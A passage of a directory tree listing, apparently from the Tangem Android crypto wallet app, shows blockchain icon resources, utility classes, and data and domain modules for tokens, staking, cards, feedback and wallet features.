│   │               │   ├── ic_tezos_16.xml
│   │               │   ├── ic_ton_22.xml
│   │               │   ├── ic_tortoise_24.xml
│   │               │   ├── ic_tron_22.xml
│   │               │   ├── ic_twitter_24.xml
│   │               │   ├── ic_vechain_22.xml
│   │               │   ├── ic_wallet_connect_24.xml
│   │               │   ├── ic_web_24.xml
│   │               │   ├── ic_xdc_22.xml
│   │               │   ├── ic_xrp_22.xml
│   │               │   ├── ic_youtube_24.xml
│   │               │   ├── ic_zksync_22.xml
│   │               │   ├── ill_businessman_3d.webp
│   │               │   ├── img_algorand_22.xml
│   │               │   ├── img_aptos_22.xml
│   │               │   ├── img_arbitrum_22.xml
│   │               │   ├── img_areon_22.xml
│   │               │   ├── img_attention_20.xml
│   │               │   ├── img_aurora_22.xml
│   │               │   ├── img_avalanche_22.xml
│   │               │   ├── img_azero_22.xml
│   │               │   ├── img_base_22.xml
│   │               │   ├── img_bittensor_22.xml
│   │               │   ├── img_bsc_22.xml
│   │               │   ├── img_btc_22.xml
│   │               │   ├── img_btc_cash_22.xml
│   │               │   ├── img_cardano_22.xml
│   │               │   ├── img_chia_22.xml
│   │               │   ├── img_cosmos_22.xml
│   │               │   ├── img_cronos_22.xml
│   │               │   ├── img_dash_22.xml
│   │               │   ├── img_decimal_22.xml
│   │               │   ├── img_dischain_22.xml
│   │               │   ├── img_dogecoin_22.xml
│   │               │   ├── img_ducatus_22.xml
│   │               │   ├── img_eth_22.xml
│   │               │   ├── img_eth_classic_22.xml
│   │               │   ├── img_eth_pow_22.xml
│   │               │   ├── img_fantom_22.xml
│   │               │   ├── img_flare_22.xml
│   │               │   ├── img_gnosis_22.xml
│   │               │   ├── img_hedera_22.xml
│   │               │   ├── img_joystream_22.xml
│   │               │   ├── img_kaspa_22.xml
│   │               │   ├── img_kava_22.xml
│   │               │   ├── img_koinos_22.xml
│   │               │   ├── img_kusama_22.xml
│   │               │   ├── img_litecoin_22.xml
│   │               │   ├── img_loader_15.xml
│   │               │   ├── img_manta_22.xml
│   │               │   ├── img_mantle_22.xml
│   │               │   ├── img_moonbeam_22.xml
│   │               │   ├── img_moonriver_22.xml
│   │               │   ├── img_near_22.xml
│   │               │   ├── img_octaspace_22.xml
│   │               │   ├── img_optimism_22.xml
│   │               │   ├── img_playa3ull_22.xml
│   │               │   ├── img_pls_22.xml
│   │               │   ├── img_polkadot_22.xml
│   │               │   ├── img_polygon_22.xml
│   │               │   ├── img_radiant_22.xml
│   │               │   ├── img_ravencoin_22.xml
│   │               │   ├── img_rsk_22.xml
│   │               │   ├── img_shibarium_22.xml
│   │               │   ├── img_solana_22.xml
│   │               │   ├── img_stellar_22.xml
│   │               │   ├── img_swap_promo_blue_banner_background.webp
│   │               │   ├── img_swap_promo_green_banner_background.webp
│   │               │   ├── img_swap_promo.webp
│   │               │   ├── img_taraxa_22.xml
│   │               │   ├── img_telos_22.xml
│   │               │   ├── img_terra2_22.xml
│   │               │   ├── img_terra_22.xml
│   │               │   ├── img_tezos_22.xml
│   │               │   ├── img_ton_22.xml
│   │               │   ├── img_travala_banner_promo_background_2.webp
│   │               │   ├── img_travala_banner_promo_background.webp
│   │               │   ├── img_tron_22.xml
│   │               │   ├── img_vechain_22.xml
│   │               │   ├── img_xdc_22.xml
│   │               │   ├── img_xrp_22.xml
│   │               │   └── img_zksync_22.xml
│   │               ├── drawable-night
│   │               │   └── card_placeholder_black.webp
│   │               ├── font
│   │               │   ├── roboto_medium.ttf
│   │               │   └── roboto_regular.ttf
│   │               ├── transition
│   │               │   └── fade.xml
│   │               └── values
│   │                   └── styles.xml
│   └── utils
│       ├── build.gradle.kts
│       └── src
│           └── main
│               └── java
│                   └── com
│                       └── tangem
│                           └── utils
│                               ├── converter
│                               │   ├── Converter.kt
│                               │   └── TwoWayConverter.kt
│                               ├── coroutines
│                               │   ├── CoroutineDispatcherProvider.kt
│                               │   ├── CoroutineExt.kt
│                               │   ├── DelayedWork.kt
│                               │   ├── FeatureCoroutineExceptionHandler.kt
│                               │   ├── JobHolder.kt
│                               │   └── PeriodicTask.kt
│                               ├── CryptoAddressFormatExtensions.kt
│                               ├── CryptoCurrencyFormatExtensions.kt
│                               ├── detekt
│                               │   └── UnusedRequiredComponent.kt
│                               ├── di
│                               │   ├── CoroutineDispatcherProviderModule.kt
│                               │   └── DelayedWorkCoroutineModule.kt
│                               ├── extensions
│                               │   ├── Char.kt
│                               │   ├── Collection.kt
│                               │   ├── DateTime.kt
│                               │   ├── Int.kt
│                               │   ├── List.kt
│                               │   ├── Set.kt
│                               │   └── WaitForMigration.kt
│                               ├── Extensions.kt
│                               ├── Provider.kt
│                               └── version
│                                   └── AppVersionProvider.kt
├── data
│   ├── analytics
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── analytics
│   │                               ├── DefaultAnalyticsRepository.kt
│   │                               └── di
│   │                                   └── AnalyticsDataModule.kt
│   ├── app-currency
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── appcurrency
│   │                               ├── DefaultAppCurrencyRepository.kt
│   │                               ├── di
│   │                               │   └── AppCurrencyDataModule.kt
│   │                               └── utils
│   │                                   └── AppCurrencyConverter.kt
│   ├── app-theme
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── apptheme
│   │                               ├── DefaultAppThemeModeRepository.kt
│   │                               └── di
│   │                                   └── AppThemeModeDataModule.kt
│   ├── balance-hiding
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── balancehiding
│   │                               ├── DefaultBalanceHidingRepository.kt
│   │                               ├── DefaultDeviceFlipDetector.kt
│   │                               ├── di
│   │                               │   └── BalanceHidingModule.kt
│   │                               └── FlipListener.kt
│   ├── card
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── card
│   │                               ├── DefaultCardRepository.kt
│   │                               ├── DefaultCardSdkConfigRepository.kt
│   │                               ├── di
│   │                               │   ├── CardDataModule.kt
│   │                               │   └── CardSdkModule.kt
│   │                               └── sdk
│   │                                   ├── CardSdkLifecycleObserver.kt
│   │                                   ├── CardSdkProvider.kt
│   │                                   └── DefaultCardSdkProvider.kt
│   ├── common
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── common
│   │                               ├── api
│   │                               │   └── ApiResponseRaise.kt
│   │                               ├── cache
│   │                               │   ├── CacheRegistry.kt
│   │                               │   ├── DefaultCacheRegistry.kt
│   │                               │   └── di
│   │                               │       └── CacheRegistryModule.kt
│   │                               └── locale
│   │                                   ├── DefaultLocaleProvider.kt
│   │                                   ├── di
│   │                                   │   └── LocaleProviderModule.kt
│   │                                   └── LocaleProvider.kt
│   ├── feedback
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── feedback
│   │                               ├── converters
│   │                               │   ├── BlockchainInfoConverter.kt
│   │                               │   └── CardInfoConverter.kt
│   │                               ├── DefaultFeedbackRepository.kt
│   │                               └── di
│   │                                   └── FeedbackRepositoryModule.kt
│   ├── onboarding
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── onboarding
│   │                               ├── DefaultOnboardingRepository.kt
│   │                               └── di
│   │                                   └── OnboardingRepositoryModule.kt
│   ├── promo
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── promo
│   │                               ├── converters
│   │                               │   └── PromoResponseConverter.kt
│   │                               ├── DefaultPromoRepository.kt
│   │                               └── di
│   │                                   └── PromoDataModule.kt
│   ├── qr-scanning
│   │   ├── build.gradle.kts
│   │   └── src
│   │       ├── main
│   │       │   └── java
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── data
│   │       │                   └── qrscanning
│   │       │                       ├── di
│   │       │                       │   └── QrScanningDataModule.kt
│   │       │                       └── repository
│   │       │                           └── DefaultQrScanningEventsRepository.kt
│   │       └── test
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── qrscanning
│   │                               └── DefaultQrScanningEventsRepositoryTest.kt
│   ├── settings
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── settings
│   │                               ├── DefaultAppRatingRepository.kt
│   │                               ├── DefaultPromoSettingsRepository.kt
│   │                               ├── DefaultSettingsRepository.kt
│   │                               └── di
│   │                                   └── SettingsDataModule.kt
│   ├── staking
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── staking
│   │                               ├── DefaultStakingRepository.kt
│   │                               └── di
│   │                                   └── StakingDataModule.kt
│   ├── tokens
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── tokens
│   │                               ├── converters
│   │                               │   └── UtxoConverter.kt
│   │                               ├── di
│   │                               │   └── TokensDataModule.kt
│   │                               ├── paging
│   │                               │   ├── CoinsPagingSource.kt
│   │                               │   └── CoinsResponseConverter.kt
│   │                               ├── repository
│   │                               │   ├── DefaultCurrenciesRepository.kt
│   │                               │   ├── DefaultCurrencyChecksRepository.kt
│   │                               │   ├── DefaultMarketCryptoCurrencyRepository.kt
│   │                               │   ├── DefaultNetworksCompatibilityRepository.kt
│   │                               │   ├── DefaultNetworksRepository.kt
│   │                               │   ├── DefaultPolkadotAccountHealthCheckRepository.kt
│   │                               │   ├── DefaultQuotesRepository.kt
│   │                               │   └── DefaultTokensListRepository.kt
│   │                               └── utils
│   │                                   ├── CardCryptoCurrenciesFactory.kt
│   │                                   ├── CryptoCurrencyFactory.kt
│   │                                   ├── CustomTokensMerger.kt
│   │                                   ├── FoundTokenConverter.kt
│   │                                   ├── NetworkOperations.kt
│   │                                   ├── NetworkStatusFactory.kt
│   │                                   ├── QuotesConverter.kt
│   │                                   ├── QuotesUnsupportedCurrenciesIdAdapter.kt
│   │                                   ├── ResponseCryptoCurrenciesFactory.kt
│   │                                   ├── TokensOperations.kt
│   │                                   ├── UserTokensBackwardCompatibility.kt
│   │                                   └── UserTokensResponseFactory.kt
│   ├── transaction
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── transaction
│   │                               ├── DefaultFeeRepository.kt
│   │                               ├── DefaultTransactionRepository.kt
│   │                               └── di
│   │                                   └── TransactionDataModule.kt
│   ├── txhistory
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── txhistory
│   │                               ├── di
│   │                               │   └── TxHistoryDataModule.kt
│   │                               └── repository
│   │                                   ├── DefaultTxHistoryRepository.kt
│   │                                   └── paging
│   │                                       └── TxHistoryPagingSource.kt
│   ├── visa
│   │   ├── build.gradle.kts
│   │   └── src
│   │       ├── debug
│   │       │   └── kotlin
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── data
│   │       │                   └── visa
│   │       │                       ├── DefaultVisaRepository.kt
│   │       │                       ├── di
│   │       │                       │   └── ImplementedVisaDataModule.kt
│   │       │                       └── utils
│   │       │                           ├── CurrencyUtils.kt
│   │       │                           ├── VisaConfig.kt
│   │       │                           ├── VisaCurrencyFactory.kt
│   │       │                           ├── VisaTxDetailsFactory.kt
│   │       │                           ├── VisaTxHistoryItemFactory.kt
│   │       │                           └── VisaTxHistoryPagingSource.kt
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── visa
│   │                               ├── di
│   │                               │   ├── ImplementedVisaRepository.kt
│   │                               │   ├── ImplementedVisaRepositoryModule.kt
│   │                               │   └── VisaDataModule.kt
│   │                               └── DummyVisaRepository.kt
│   ├── wallet-connect
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── data
│   │                           └── walletconnect
│   │                               ├── DefaultWalletConnectRepository.kt
│   │                               └── di
│   │                                   └── WalletConnectDataModule.kt
│   └── wallets
│       ├── build.gradle.kts
│       └── src
│           └── main
│               └── java
│                   └── com
│                       └── tangem
│                           └── data
│                               └── wallets
│                                   ├── DefaultWalletAddressServiceRepository.kt
│                                   ├── DefaultWalletNamesMigrationRepository.kt
│                                   ├── DefaultWalletsRepository.kt
│                                   └── di
│                                       └── WalletsDataModule.kt
├── domain
│   ├── analytics
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── analytics
│   │                               ├── CheckIsWalletToppedUpUseCase.kt
│   │                               ├── model
│   │                               │   └── WalletBalanceState.kt
│   │                               └── repository
│   │                                   └── AnalyticsRepository.kt
│   ├── app-currency
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── appcurrency
│   │   │                               └── model
│   │   │                                   └── AppCurrency.kt
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── appcurrency
│   │                               ├── error
│   │                               │   ├── AvailableCurrenciesError.kt
│   │                               │   └── SelectedAppCurrencyError.kt
│   │                               ├── extenstions
│   │                               │   └── UseCaseExtensions.kt
│   │                               ├── FetchAppCurrenciesUseCase.kt
│   │                               ├── GetAvailableCurrenciesUseCase.kt
│   │                               ├── GetSelectedAppCurrencyUseCase.kt
│   │                               ├── repository
│   │                               │   └── AppCurrencyRepository.kt
│   │                               └── SelectAppCurrencyUseCase.kt
│   ├── app-theme
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── apptheme
│   │   │                               └── model
│   │   │                                   └── AppThemeMode.kt
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── apptheme
│   │                               ├── ChangeAppThemeModeUseCase.kt
│   │                               ├── error
│   │                               │   └── AppThemeModeError.kt
│   │                               ├── GetAppThemeModeUseCase.kt
│   │                               └── repository
│   │                                   └── AppThemeModeRepository.kt
│   ├── balance-hiding
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── balancehiding
│   │   │                               └── BalanceHidingSettings.kt
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── balancehiding
│   │                               ├── DeviceFlipDetector.kt
│   │                               ├── error
│   │                               │   └── HideBalancesError.kt
│   │                               ├── GetBalanceHidingSettingsUseCase.kt
│   │                               ├── ListenToFlipsUseCase.kt
│   │                               ├── repositories
│   │                               │   └── BalanceHidingRepository.kt
│   │                               └── UpdateBalanceHidingSettingsUseCase.kt
│   ├── card
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── card
│   │                               ├── DeleteSavedAccessCodesUseCase.kt
│   │                               ├── DerivePublicKeysUseCase.kt
│   │                               ├── GetBiometricsStatusUseCase.kt
│   │                               ├── GetExtendedPublicKeyForCurrencyUseCase.kt
│   │                               ├── models
│   │                               │   └── ResetCardError.kt
│   │                               ├── repository
│   │                               │   ├── CardRepository.kt
│   │                               │   ├── CardSdkConfigRepository.kt
│   │                               │   ├── DerivationsRepository.kt
│   │                               │   └── ScanCardRepository.kt
│   │                               ├── ResetCardUseCase.kt
│   │                               ├── ScanCardException.kt
│   │                               ├── ScanCardProcessor.kt
│   │                               ├── ScanCardUseCase.kt
│   │                               ├── SetAccessCodeRequestPolicyUseCase.kt
│   │                               ├── SetCardWasScannedUseCase.kt
│   │                               └── WasCardScannedUseCase.kt
│   ├── core
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── core
│   │                               ├── chain
│   │                               │   ├── ChainProcessor.kt
│   │                               │   └── Chains.kt
│   │                               ├── error
│   │                               │   └── DataError.kt
│   │                               ├── lce
│   │                               │   ├── LceFlow.kt
│   │                               │   ├── Lce.kt
│   │                               │   └── LceRaise.kt
│   │                               └── utils
│   │                                   ├── EitherExt.kt
│   │                                   └── LceExt.kt
│   ├── demo
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── demo
│   │                               ├── DemoConfig.kt
│   │                               ├── DemoTransactionSender.kt
│   │                               └── IsDemoCardUseCase.kt
│   ├── feedback
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── feedback
│   │                               ├── FeedbackDataBuilder.kt
│   │                               ├── GetFeedbackEmailUseCase.kt
│   │                               ├── models
│   │                               │   ├── AppLogModel.kt
│   │                               │   ├── BlockchainErrorInfo.kt
│   │                               │   ├── BlockchainInfo.kt
│   │                               │   ├── CardInfo.kt
│   │                               │   ├── FeedbackEmail.kt
│   │                               │   ├── FeedbackEmailType.kt
│   │                               │   ├── PhoneInfo.kt
│   │                               │   └── UserWalletsInfo.kt
│   │                               ├── repository
│   │                               │   └── FeedbackRepository.kt
│   │                               ├── SaveBlockchainErrorUseCase.kt
│   │                               └── utils
│   │                                   ├── AppLogsFormatter.kt
│   │                                   ├── EmailMessageBodyResolver.kt
│   │                                   ├── EmailMessageTitleResolver.kt
│   │                                   ├── EmailSubjectResolver.kt
│   │                                   ├── FeedbackConstants.kt
│   │                                   └── StringBuilderExt.kt
│   ├── legacy
│   │   ├── build.gradle.kts
│   │   ├── proguard-rules.pro
│   │   └── src
│   │       ├── main
│   │       │   ├── assets
│   │       │   │   └── contract_methods.json
│   │       │   └── java
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── domain
│   │       │                   ├── analytics
│   │       │                   │   └── ChangeCardAnalyticsContextUseCase.kt
│   │       │                   ├── common
│   │       │                   │   ├── BlockchainNetwork.kt
│   │       │                   │   ├── CardTypesResolver.kt
│   │       │                   │   ├── configs
│   │       │                   │   │   ├── CardConfig.kt
│   │       │                   │   │   ├── EdSingleCurrencyCardConfig.kt
│   │       │                   │   │   ├── GenericCardConfig.kt
│   │       │                   │   │   ├── MultiWalletCardConfig.kt
│   │       │                   │   │   └── Wallet2CardConfig.kt
│   │       │                   │   ├── DerivationStyleProvider.kt
│   │       │                   │   ├── extensions
│   │       │                   │   │   ├── ByteArray.kt
│   │       │                   │   │   ├── CardSdk.kt
│   │       │                   │   │   ├── Coroutine.kt
│   │       │                   │   │   └── WalletManagerFactory.kt
│   │       │                   │   ├── LogConfig.kt
│   │       │                   │   ├── TangemCardTypesResolver.kt
│   │       │                   │   ├── TapWorkarounds.kt
│   │       │                   │   ├── TwinsHelper.kt
│   │       │                   │   └── util
│   │       │                   │       └── ScanResponseExtensions.kt
│   │       │                   ├── exchange
│   │       │                   │   └── RampStateManager.kt
│   │       │                   ├── features
│   │       │                   │   └── addCustomToken
│   │       │                   │       └── CustomCurrency.kt
│   │       │                   ├── feedback
│   │       │                   │   └── FeedbackManagerFeatureToggles.kt
│   │       │                   ├── redux
│   │       │                   │   ├── DomainState.kt
│   │       │                   │   ├── DomainStore.kt
│   │       │                   │   ├── extensions
│   │       │                   │   │   └── Dispatch.kt
│   │       │                   │   ├── global
│   │       │                   │   │   ├── DomainGlobalAction.kt
│   │       │                   │   │   ├── DomainGlobalHub.kt
│   │       │                   │   │   └── DomainGlobalState.kt
│   │       │                   │   ├── LegacyAction.kt
│   │       │                   │   ├── ReduxStateHolder.kt
│   │       │                   │   └── ReStoreHub.kt
│   │       │                   ├── tokens
│   │       │                   │   └── TokensAction.kt
│   │       │                   └── walletmanager
│   │       │                       ├── DefaultWalletManagersFacade.kt
│   │       │                       ├── model
│   │       │                       │   ├── Address.kt
│   │       │                       │   ├── CryptoCurrencyAmount.kt
│   │       │                       │   ├── CryptoCurrencyTransaction.kt
│   │       │                       │   ├── SmartContractMethod.kt
│   │       │                       │   └── UpdateWalletManagerResult.kt
│   │       │                       ├── utils
│   │       │                       │   ├── CryptoCurrencyTypeConverter.kt
│   │       │                       │   ├── SdkAddressToAddressConverter.kt
│   │       │                       │   ├── SdkPageConverter.kt
│   │       │                       │   ├── SdkRequirementsConditionConverter.kt
│   │       │                       │   ├── SdkTokenConverter.kt
│   │       │                       │   ├── SdkTransactionHistoryItemConverter.kt
│   │       │                       │   ├── SdkTransactionHistoryStateConverter.kt
│   │       │                       │   ├── SdkTransactionTypeConverter.kt
│   │       │                       │   ├── TransactionDataToTxHistoryItemConverter.kt
│   │       │                       │   ├── UpdateWalletManagerResultFactory.kt
│   │       │                       │   └── WalletManagerFactory.kt
│   │       │                       └── WalletManagersFacade.kt
│   │       └── test
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           ├── common
│   │                           │   └── TwinsHelperTest.kt
│   │                           └── features
│   │                               └── BlockchainTests.kt
│   ├── models
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── models
│   │                               └── scan
│   │                                   ├── CardDTO.kt
│   │                                   └── ScanResponse.kt
│   ├── onboarding
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── onboarding
│   │                               ├── repository
│   │                               │   └── OnboardingRepository.kt
│   │                               ├── SaveTwinsOnboardingShownUseCase.kt
│   │                               └── WasTwinsOnboardingShownUseCase.kt
│   ├── qr-scanning
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── qrscanning
│   │   │                               └── models
│   │   │                                   ├── QrResult.kt
│   │   │                                   └── SourceType.kt
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── qrscanning
│   │                               ├── repository
│   │                               │   └── QrScanningEventsRepository.kt
│   │                               └── usecases
│   │                                   ├── EmitQrScannedEventUseCase.kt
│   │                                   ├── ListenToQrScanningUseCase.kt
│   │                                   └── ParseQrCodeUseCase.kt
│   ├── settings
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── settings
│   │                               ├── CanUseBiometryUseCase.kt
│   │                               ├── DeleteDeprecatedLogsUseCase.kt
│   │                               ├── IncrementAppLaunchCounterUseCase.kt
│   │                               ├── IsReadyToShowRateAppUseCase.kt
│   │                               ├── IsSendTapHelpEnabledUseCase.kt
│   │                               ├── IsWalletsScrollPreviewEnabled.kt
│   │                               ├── NeverShowTapHelpUseCase.kt
│   │                               ├── NeverToShowWalletsScrollPreview.kt
│   │                               ├── NeverToSuggestRateAppUseCase.kt
│   │                               ├── RemindToRateAppLaterUseCase.kt
│   │                               ├── repositories
│   │                               │   ├── AppRatingRepository.kt
│   │                               │   ├── LegacySettingsRepository.kt
│   │                               │   ├── PromoSettingsRepository.kt
│   │                               │   └── SettingsRepository.kt
│   │                               ├── SetSaveWalletScreenShownUseCase.kt
│   │                               ├── SetWalletWithFundsFoundUseCase.kt
│   │                               ├── ShouldShowSaveWalletScreenUseCase.kt
│   │                               ├── ShouldShowSwapPromoTokenUseCase.kt
│   │                               ├── ShouldShowSwapPromoWalletUseCase.kt
│   │                               └── ShouldShowTravalaPromoWalletUseCase.kt
│   ├── staking
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── staking
│   │                               ├── GetStakingAvailabilityUseCase.kt
│   │                               ├── GetStakingEntryInfoUseCase.kt
│   │                               ├── model
│   │                               │   ├── StakingAvailability.kt
│   │                               │   └── StakingEntryInfo.kt
│   │                               └── repositories
│   │                                   └── StakingRepository.kt
│   ├── tokens
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           ├── promo
│   │   │                           │   └── PromoBanner.kt
│   │   │                           └── tokens
│   │   │                               ├── model
│   │   │                               │   ├── Amount.kt
│   │   │                               │   ├── blockchains
│   │   │                               │   │   └── UtxoAmountLimit.kt
│   │   │                               │   ├── CryptoCurrencyAddress.kt
│   │   │                               │   ├── CryptoCurrencyAmountStatus.kt
│   │   │                               │   ├── CryptoCurrency.kt
│   │   │                               │   ├── CryptoCurrencyStatus.kt
│   │   │                               │   ├── FeePaidCurrency.kt
│   │   │                               │   ├── FoundToken.kt
│   │   │                               │   ├── NetworkAddress.kt
│   │   │                               │   ├── Network.kt
│   │   │                               │   ├── NetworkStatus.kt
│   │   │                               │   ├── Quote.kt
│   │   │                               │   ├── remove
│   │   │                               │   │   └── RemoveCurrencyError.kt
│   │   │                               │   ├── Token.kt
│   │   │                               │   └── warnings
│   │   │                               │       ├── CryptoCurrencyWarning.kt
│   │   │                               │       └── HederaWarnings.kt
│   │   │                               ├── models
│   │   │                               │   └── analytics
│   │   │                               │       ├── TokenExchangeAnalyticsEvent.kt
│   │   │                               │       ├── TokenReceiveAnalyticsEvent.kt
│   │   │                               │       ├── TokenScreenAnalyticsEvent.kt
│   │   │                               │       └── TokenSwapPromoAnalyticsEvent.kt
│   │   │                               └── utils
│   │   │                                   └── BigDecimalUtils.kt
│   │   └── src
│   │       ├── main
│   │       │   └── kotlin
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── domain
│   │       │                   └── tokens
│   │       │                       ├── AddCryptoCurrenciesUseCase.kt
│   │       │                       ├── ApplyTokenListSortingUseCase.kt
│   │       │                       ├── AreTokensSupportedByNetworkUseCase.kt
│   │       │                       ├── CheckCurrencyCompatibilityUseCase.kt
│   │       │                       ├── error
│   │       │                       │   ├── AddCurrencyError.kt
│   │       │                       │   ├── AddCustomTokenError.kt
│   │       │                       │   ├── CurrencyStatusError.kt
│   │       │                       │   ├── GetCurrenciesError.kt
│   │       │                       │   ├── mapper
│   │       │                       │   │   ├── CurrencyStatusErrorMappers.kt
│   │       │                       │   │   ├── TokenListErrorMappers.kt
│   │       │                       │   │   └── TokenListSortingErrorMappers.kt
│   │       │                       │   ├── TokenListError.kt
│   │       │                       │   └── TokenListSortingError.kt
│   │       │                       ├── FetchCardTokenListUseCase.kt
│   │       │                       ├── FetchCurrencyStatusUseCase.kt
│   │       │                       ├── FetchPendingTransactionsUseCase.kt
│   │       │                       ├── FetchTokenListUseCase.kt
│   │       │                       ├── FindTokenByContractAddressUseCase.kt
│   │       │                       ├── GetBalanceNotEnoughForFeeWarningUseCase.kt
│   │       │                       ├── GetCardTokensListUseCase.kt
│   │       │                       ├── GetCryptoCurrenciesUseCase.kt
│   │       │                       ├── GetCryptoCurrencyActionsUseCase.kt
│   │       │                       ├── GetCryptoCurrencyStatusesSyncUseCase.kt
│   │       │                       ├── GetCryptoCurrencyStatusSyncUseCase.kt
│   │       │                       ├── GetCryptoCurrencyUseCase.kt
│   │       │                       ├── GetCurrencyStatusUpdatesUseCase.kt
│   │       │                       ├── GetCurrencyWarningsUseCase.kt
│   │       │                       ├── GetFeePaidCryptoCurrencyStatusSyncUseCase.kt
│   │       │                       ├── GetGlobalTokenListUseCase.kt
│   │       │                       ├── GetMissedAddressesCryptoCurrenciesUseCase.kt
│   │       │                       ├── GetNetworkAddressesUseCase.kt
│   │       │                       ├── GetNetworkCoinStatusUseCase.kt
│   │       │                       ├── GetNetworksSupportedByWallet.kt
│   │       │                       ├── GetPolkadotCheckHasImmortalUseCase.kt
│   │       │                       ├── GetPolkadotCheckHasResetUseCase.kt
│   │       │                       ├── GetPrimaryCurrencyStatusUpdatesUseCase.kt
│   │       │                       ├── GetTokenListUseCase.kt
│   │       │                       ├── GetWalletTotalBalanceUseCase.kt
│   │       │                       ├── IsAmountSubtractAvailableUseCase.kt
│   │       │                       ├── IsCryptoCurrencyCoinCouldHideUseCase.kt
│   │       │                       ├── legacy
│   │       │                       │   └── TradeCryptoAction.kt
│   │       │                       ├── model
│   │       │                       │   ├── CurrencyAmount.kt
│   │       │                       │   ├── NetworkGroup.kt
│   │       │                       │   ├── ScenarioUnavailabilityReason.kt
